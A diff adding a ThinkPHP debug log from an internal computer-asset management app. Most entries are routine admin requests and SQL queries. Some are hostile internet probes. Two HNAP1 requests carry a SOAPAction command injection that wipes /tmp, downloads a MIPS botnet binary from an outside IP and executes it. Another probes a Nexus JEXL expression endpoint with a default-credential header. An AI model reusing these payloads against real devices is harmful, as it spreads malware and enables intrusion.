+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/index.html [ array (
+  0 => 'PAdmin',
+  1 => 'data',
+  2 => 'msg',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T16:00:02+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/computer.html
+[运行时间：0.113554s] [吞吐率：8.81req/s] [内存消耗：736.63kb] [文件加载：80]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/index/index.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/computer_html' => '',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/computer.html [ array (
+  0 => 'PAdmin',
+  1 => 'internetAccess',
+) ]
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000387s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `internet_access` [ RunTime:0.048362s ]
+[ sql ] [ SQL ] SELECT * FROM `internet_access` WHERE  `disabled` = 0 [ RunTime:0.000433s ]
+---------------------------------------------------------------
+[ 2020-12-01T16:00:02+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/animate.css
+[运行时间：0.056728s] [吞吐率：17.63req/s] [内存消耗：478.14kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/animate_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T16:00:02+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/font-awesome.css
+[运行时间：0.058370s] [吞吐率：17.13req/s] [内存消耗：522.27kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/font-awesome_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T16:00:02+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/animate.css
+[运行时间：0.003678s] [吞吐率：271.88req/s] [内存消耗：469.18kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/animate_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T16:00:02+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/font-awesome.css
+[运行时间：0.003678s] [吞吐率：271.88req/s] [内存消耗：469.20kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/font-awesome_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T16:00:03+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/getcomplist.html?page=1&limit=20&keyword=
+[运行时间：0.133452s] [吞吐率：7.49req/s] [内存消耗：935.11kb] [文件加载：90]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'x-requested-with' => 'XMLHttpRequest',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/index/computer.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242; Hm_lpvt_d214947968792b839fd669a4decaaffc=1606809603',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/getcomplist_html' => '',
+  'page' => '1',
+  'limit' => '20',
+  'keyword' => '',
+)
+[ info ] [ DB ] INIT mysql
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000532s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `computer` [ RunTime:0.018720s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%%'  OR `s`.`name` LIKE '%%'  OR `c`.`FQDN` LIKE '%%'  OR `c`.`asset_id` LIKE '%%'  OR `c`.`MAC` LIKE '%%'  OR `c`.`ip_addr_v4` LIKE '%%'  OR `c`.`domain_name` LIKE '%%' LIMIT 1 [ RunTime:0.019961s ]
+[ sql ] [ SQL ] SELECT `c`.*,d.name as department,s.name as staff FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%%'  OR `s`.`name` LIKE '%%'  OR `c`.`FQDN` LIKE '%%'  OR `c`.`asset_id` LIKE '%%'  OR `c`.`MAC` LIKE '%%'  OR `c`.`ip_addr_v4` LIKE '%%'  OR `c`.`domain_name` LIKE '%%' LIMIT 0,20 [ RunTime:0.000871s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `os` [ RunTime:0.002596s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 6 LIMIT 1 [ RunTime:0.000400s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `computer_internet_access` [ RunTime:0.001694s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 1 [ RunTime:0.000952s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000367s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 2 [ RunTime:0.000352s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000341s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 4 [ RunTime:0.000295s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000244s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 5 [ RunTime:0.000264s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000236s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 7 [ RunTime:0.000263s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 8 [ RunTime:0.000286s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000183s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 9 [ RunTime:0.000234s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 10 [ RunTime:0.000284s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000252s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 11 [ RunTime:0.000251s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000216s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 12 [ RunTime:0.000289s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 13 [ RunTime:0.000228s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000182s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 14 [ RunTime:0.000230s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000198s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 15 [ RunTime:0.000281s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 11 LIMIT 1 [ RunTime:0.000241s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 16 [ RunTime:0.000227s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 17 [ RunTime:0.000233s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 18 [ RunTime:0.000227s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000206s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 20 [ RunTime:0.000236s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000174s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 21 [ RunTime:0.000239s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000183s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 22 [ RunTime:0.000224s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000196s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 23 [ RunTime:0.000239s ]
+---------------------------------------------------------------
+[ 2020-12-01T16:02:05+08:00 ] 146.185.218.198 POST /HNAP1/
+[运行时间：0.006064s] [吞吐率：164.91req/s] [内存消耗：495.07kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'text/xml; charset="utf-8"',
+  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://45.145.185.74/bins/Astra.mips && chmod +x Astra.mips; ./Astra.mips hnap.rep`',
+  'content-length' => '640',
+)
+[ info ] [ PARAM ] array (
+  '/HNAP1/' => '',
+  '<?xml_version' => '&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;AddPortMapping xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;&lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;&lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;&lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;&lt;InternalPort&gt;1234&lt;/InternalPort&gt;&lt;/AddPortMapping&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
+
+',
+)
+---------------------------------------------------------------
+[ 2020-12-01T20:41:24+08:00 ] 64.31.8.10 GET example.comhttp://example.com/
+[运行时间：0.004087s] [吞吐率：244.68req/s] [内存消耗：488.73kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T20:41:24+08:00 ] 64.31.8.10 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.002645s] [吞吐率：378.07req/s] [内存消耗：485.56kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T20:44:49+08:00 ] 64.31.8.10 GET example.comhttp://example.com/
+[运行时间：0.003089s] [吞吐率：323.73req/s] [内存消耗：488.73kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T20:44:49+08:00 ] 64.31.8.10 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.002598s] [吞吐率：384.90req/s] [内存消耗：485.56kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T20:54:01+08:00 ] 167.248.133.53 GET 113.116.135.3:8081/
+[运行时间：0.006744s] [吞吐率：148.28req/s] [内存消耗：489.42kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T22:43:11+08:00 ] 49.235.93.34 POST /HNAP1/
+[运行时间：0.007424s] [吞吐率：134.70req/s] [内存消耗：495.07kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'text/xml; charset="utf-8"',
+  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://45.145.185.74/bins/Astra.mips && chmod +x Astra.mips; ./Astra.mips hnap.rep`',
+  'content-length' => '640',
+)
+[ info ] [ PARAM ] array (
+  '/HNAP1/' => '',
+  '<?xml_version' => '&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;AddPortMapping xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;&lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;&lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;&lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;&lt;InternalPort&gt;1234&lt;/InternalPort&gt;&lt;/AddPortMapping&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
+
+',
+)
+---------------------------------------------------------------
+[ 2020-12-01T23:44:43+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/
+[运行时间：0.008190s] [吞吐率：122.10req/s] [内存消耗：490.88kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T23:44:44+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/jars
+[运行时间：0.005859s] [吞吐率：170.67req/s] [内存消耗：498.10kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/jars' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T23:44:45+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.003063s] [吞吐率：326.48req/s] [内存消耗：486.88kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T23:44:45+08:00 ] 91.241.19.84 POST 113.116.135.3:8081/service/extdirect
+[运行时间：0.003459s] [吞吐率：289.10req/s] [内存消耗：469.13kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-length' => '293',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/service/extdirect' => '',
+  'action' => 'coreui_Component',
+  'data' => 
+  array (
+    0 => 
+    array (
+      'filter' => 
+      array (
+        0 => 
+        array (
+          'property' => 'repositoryName',
+          'value' => '*',
+        ),
+        1 => 
+        array (
+          'property' => 'expression',
+          'value' => '1==1',
+        ),
+        2 => 
+        array (
+          'property' => 'type',
+          'value' => 'jexl',
+        ),
+      ),
+      'limit' => '50',
+      'page' => '1',
+      'sort' => 
+      array (
+        0 => 
+        array (
+          'direction' => 'ASC',
+          'property' => 'name',
+        ),
+      ),
+      'start' => '0',
+    ),
+  ),
+  'method' => 'previewAssets',
+  'tid' => '18',
+  'type' => 'rpc',
+)
+---------------------------------------------------------------
+[ 2020-12-01T23:44:46+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.003411s] [吞吐率：293.16req/s] [内存消耗：486.55kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/jars',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T23:57:19+08:00 ] 60.191.36.75 GET /
+[运行时间：0.003760s] [吞吐率：265.97req/s] [内存消耗：487.85kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+)
+[ info ] [ PARAM ] array (
+)
